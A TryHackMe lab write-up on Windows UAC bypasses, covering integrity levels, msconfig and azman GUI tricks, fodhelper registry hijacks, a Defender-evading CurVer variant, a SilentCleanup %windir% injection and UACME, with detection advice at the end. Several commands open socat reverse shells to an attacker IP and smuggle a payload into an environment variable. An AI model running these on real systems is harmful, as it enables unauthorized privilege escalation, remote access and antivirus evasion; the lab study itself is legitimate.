# TryHackMe — Bypassing UAC
Windows Privilege Escalation | Post-Exploitation

This room covers how to bypass User Account Control (UAC) on Windows — the mechanism that forces processes to run with a low-privilege token by default, even when launched by an administrator. The interesting part isn't just the exploits themselves, it's *why* they work: Microsoft doesn't treat UAC as a security boundary, just a convenience feature, which means most of these bypasses are known, documented, and still unpatched.

> **Category:** Windows Privilege Escalation  
> **Difficulty:** Medium  
> **Platform:** TryHackMe

---

## How UAC actually works

Every process on Windows runs with an access token that has an assigned **Integrity Level (IL)**. This is Mandatory Integrity Control (MIC), and it's evaluated *before* the standard DACL — meaning your permissions on paper don't matter if your IL is too low.

The four levels, low to high:

- **Low** — internet-facing stuff, e.g. IE, barely any permissions
- **Medium** — standard users, and admins' filtered tokens
- **High** — admins' elevated tokens (or all admin tokens if UAC is off)
- **System** — OS-level only

Here's the part that trips people up: administrators don't get one token, they get two. A **filtered token** at Medium IL used for everyday stuff, and an **elevated token** at High IL that only gets used once you click through the UAC prompt. So even if you land a shell as a local admin, you're almost certainly sitting at Medium IL — you can confirm this with:

```
whoami /groups | find "Label"
```

If you see `Mandatory Label\Medium Mandatory Level`, you're stuck with the filtered token, and things like `net user /add` will throw `Access is denied` even though you're technically in the Administrators group.

Elevation itself is handled by the **Application Information Service (Appinfo)**. When something needs to run elevated, the request goes to Appinfo, which checks the app's manifest for auto-elevate eligibility, then (if needed) pops `consent.exe` on a secure desktop for the user to approve. Once approved, Appinfo runs the process with the elevated token and re-parents it back to the shell that requested it.

The notification levels (Control Panel > UAC settings) matter less than people think — the bottom three are functionally identical from an attacker's perspective. Only **Always Notify** changes anything, since it forces a prompt even for auto-elevating binaries, which kills most of the tricks below.

---

## Bypass #1 & #2: GUI abuse of auto-elevating binaries

Some signed Microsoft binaries in trusted paths (`System32`, `Program Files`) are allowed to auto-elevate without ever showing a UAC prompt — you can confirm this by checking a binary's manifest with Sysinternals `sigcheck`:

```
sigcheck64.exe -m c:\windows\system32\msconfig.exe
```

which shows `<autoElevate>true</autoElevate>` right in the manifest.

**msconfig.exe** is the easy case. Open it, check it in Process Hacker, and you'll see it's already running at High IL despite no prompt ever appearing. It also happens to have a built-in way to spawn a shell — under the **Tools** tab there's a "Launch" button that opens `cmd.exe`. Since that shell is spawned from msconfig's process, it inherits the same High IL token.

```
C:\> C:\flags\GetFlag-msconfig.exe
```

**azman.msc** (Authorization Manager) auto-elevates the same way (all `.msc` snap-ins run through `mmc.exe`), but it doesn't have an obvious shell built in. The workaround: open the Help menu, right-click anywhere in the help content, and choose **View Source** — this spawns Notepad. From Notepad, go to File > Open, switch the file filter to "All Files", browse to `System32`, find `cmd.exe`, and right-click > Open instead of double-clicking. That cmd.exe inherits the High IL token from the mmc.exe process tree, which you can verify in Process Hacker.

```
C:\> C:\flags\GetFlag-azman.exe
```

---

## Bypass #3: fodhelper.exe (registry hijack)

This is the one that actually matters operationally, because unlike msconfig/azman it doesn't need GUI access — it works from a plain remote shell. It's also been used in the wild by the Glupteba malware family.

`fodhelper.exe` is auto-elevating and, when it runs, it resolves a command through the `ms-settings` ProgID in the registry. The key detail: `HKEY_CLASSES_ROOT` is a merge of `HKLM\Software\Classes` (system-wide) and `HKCU\Software\Classes` (per-user) — and **HKCU wins** if both exist. So any unprivileged user can plant a per-user override for `ms-settings` and control what fodhelper actually executes, without needing write access to HKLM.

From a Medium IL shell (admin group member, default UAC settings):

```cmd
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f

fodhelper.exe
```

The empty `DelegateExecute` value matters — without it Windows ignores your hijacked command entirely and falls back to the default.

Catch the shell on your listener, and confirm the IL:

```
whoami /groups | find "Label"
Mandatory Label\High Mandatory Level
```

```
C:\> C:\flags\GetFlag-fodhelper.exe
THM{AUTOELEVATE4THEWIN}
```

Clean up before moving on, or the leftover key can interfere with later steps:

```cmd
reg delete HKCU\Software\Classes\ms-settings\ /f
```

---

## Bypass #4: fodhelper with Defender enabled

With Defender turned on, the exploit above gets caught almost instantly — you'll see an alert referencing the registry modification, and the key gets wiped within about a second.

First attempt: chain the reg write and the fodhelper call together and hope you win the race before Defender remediates:

```cmd
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
```

It sometimes works, but it's a coin flip and Defender still alerts either way — not something you'd rely on.

A cleaner variant (credit to **@V3ded**) avoids touching the `ms-settings` command path directly. Instead, it creates a brand-new, arbitrarily named ProgID with its own payload, and points `ms-settings\CurVer` at that new ProgID. `CurVer` is a legitimate mechanism Windows uses to redirect a file type to its "current version," and fodhelper follows that redirection without question.

The PowerShell version of this is still signature-detected by Defender:

```powershell
$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

But translate the exact same logic into plain `cmd.exe`, and Defender doesn't flag it at all:

```cmd
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe
```

```
C:\> C:\flags\GetFlag-fodhelper-curver.exe
THM{AV_UAC_BYPASS_4_ALL}
```

Worth calling out: the fact that changing the *scripting language* alone was enough to slip past detection says a lot about how narrow static AV signatures can be — they were written against the published PoC, not the underlying technique. Detection built around registry key locations and process ancestry (e.g., a shell spawned as a child of `fodhelper.exe`) holds up a lot better than string/hash matching.

Cleanup:

```cmd
reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f
```

---

## Bypass #5: DiskCleanup scheduled task + environment variable injection

Everything above depends on auto-elevating binaries, which stop working the moment UAC is set to **Always Notify**. Scheduled tasks sidestep this entirely, because by design they're meant to run without any user interaction regardless of the UAC level.

The target here is `\Microsoft\Windows\DiskCleanup\SilentCleanup`. Opening it in Task Scheduler shows two relevant settings: it runs as the **Users** account (inherits the caller's context), and it has **"Run with highest privileges"** enabled — which for an admin means it grabs the High IL elevated token automatically, no prompt required.

Its action is:

```
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
```

Since that command is built by expanding environment variables, and `%windir%` can be overridden per-user via `HKCU\Environment`, you can hijack the whole thing:

```cmd
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

The `&REM ` at the end comments out the rest of the original command once `%windir%` is expanded, so what actually runs is just your payload:

```
cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
```

```
C:\> C:\flags\GetFlag-diskcleanup.exe
THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
```

**Don't skip this cleanup step** — a huge number of Windows components depend on `%windir%`, and leaving it overridden will break things on the box:

```cmd
reg delete "HKCU\Environment" /v "windir" /f
```

---

## Automating it: UACME

[UACME](https://github.com/hfiref0x/UACME) by @hfiref0x packages most known UAC bypasses into one tool. The `Akagi` component runs a bypass by method number:

```cmd
cd C:\tools
UACME-Akagi64.exe 33
```

The three techniques from this room map to:

- `33` — fodhelper.exe (direct registry hijack)
- `34` — DiskCleanup scheduled task
- `70` — fodhelper.exe via CurVer

It's a great tool for quickly checking whether a technique still works on a given build, but running it as-is against a real target gets flagged by pretty much any modern EDR. The value of walking through the manual steps above is that it lets you build your own variants when the canned tooling gets burned.

---

## MITRE ATT&CK

- **T1548.002** — Abuse Elevation Control Mechanism: Bypass User Account Control (covers all of the above)
- **T1053.005** — Scheduled Task/Job: Scheduled Task (DiskCleanup abuse)

## Detection ideas

A few things that would catch most of this on a monitored host:

- Set UAC to **Always Notify**. This alone kills the fodhelper-class bypasses and forces an attacker toward the scheduled-task route.
- Sysmon Event ID 13 (registry value set) on writes to `HKCU\Software\Classes\ms-settings\Shell\Open\command` or `HKCU\Software\Classes\ms-settings\CurVer`, especially if followed by a child process of `fodhelper.exe`.
- Watch for writes to `HKCU\Environment`, particularly `windir` — normal users never touch this.
- Alert on manual/on-demand execution of `SilentCleanup` outside its normal scheduled trigger.
- Generally, flag `cmd.exe` or `powershell.exe` spawned as a child of `fodhelper.exe`, `mmc.exe`, or `cleanmgr.exe` — none of these should normally spawn an interactive shell.
- Don't rely purely on static signatures — as shown above, changing the scripting language alone was enough to evade Defender. Process lineage and registry location are more durable signals than payload content.

